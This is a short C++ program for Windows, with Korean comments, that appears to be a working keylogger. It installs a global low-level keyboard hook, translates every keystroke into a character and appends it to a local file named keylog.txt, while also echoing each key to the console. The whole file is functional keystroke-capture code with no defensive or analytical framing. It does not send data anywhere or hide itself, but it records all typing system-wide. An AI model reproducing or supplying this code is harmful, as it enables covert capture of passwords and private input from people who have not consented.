#include <windows.h>
#include <fstream>
#include <string>
#include <iostream>

HHOOK g_hHook = NULL;
std::ofstream g_log("keylog.txt", std::ios::app);

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = p->vkCode;
            // 문자 변환
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);
            WCHAR unicodeChar[5] = {0};
            int result = ToUnicode(vkCode, p->scanCode, keyboardState, unicodeChar, 4, 0);
            std::string charStr;
            if (result > 0) {
                // 유니코드 -> 멀티바이트 변환
                char mbChar[8] = {0};
                WideCharToMultiByte(CP_ACP, 0, unicodeChar, 1, mbChar, 8, NULL, NULL);
                charStr = mbChar;
            }
            g_log << "VK: " << vkCode;
            if (!charStr.empty()) {
                g_log << " ('" << charStr << "')";
            }
            g_log << std::endl;
            g_log.flush();
            // 콘솔에도 출력
            std::cout << "VK: " << vkCode;
            if (!charStr.empty()) {
                std::cout << " ('" << charStr << "')";
            }
            std::cout << std::endl;
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

int main() {
    // 후킹 설치
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_hHook) {
        MessageBoxA(NULL, "Hook install failed!", "Error", MB_OK);
        return 1;
    }

    // 메시지 루프 (종료 시 Ctrl+C 등으로 강제 종료)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 후킹 해제
    UnhookWindowsHookEx(g_hHook);
    g_log.close();
    return 0;
}